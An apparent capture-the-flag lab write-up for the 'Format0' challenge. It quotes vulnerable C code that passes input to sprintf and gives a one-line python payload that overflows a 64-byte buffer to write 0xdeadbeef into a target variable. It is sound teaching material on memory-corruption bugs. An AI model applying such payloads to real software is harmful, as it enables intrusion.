<h2>Goal</h2>

Looking at the source code for Format0, this is more akin to a buffer overflow.  The goal is to write over the variable `target` with `0xdeadbeef`, by overflowing the `buffer` variable.  The only difference between stack1 and this level is that the overwriting of `target` occurs in the `sprintf` function instead of a `strcpy`. This function is part of a special type of ANSI C function.  More in-depth explanation to format string exploits check out the following paper: [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)

```c
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
```



<h2>Solution</h2>

This solution for this challenge is the actuall similar to the stack1 challenge. Fill the buffer with 64 bytes, then put in the required value `0xdeadbeef`. Keep in mind this challenge requires passing a argument, it does not take standard input after execution.

```bash 
./format0 `python -c 'import struct ; print"A"*64+struct.pack("I", 0xdeadbeef)'`
```
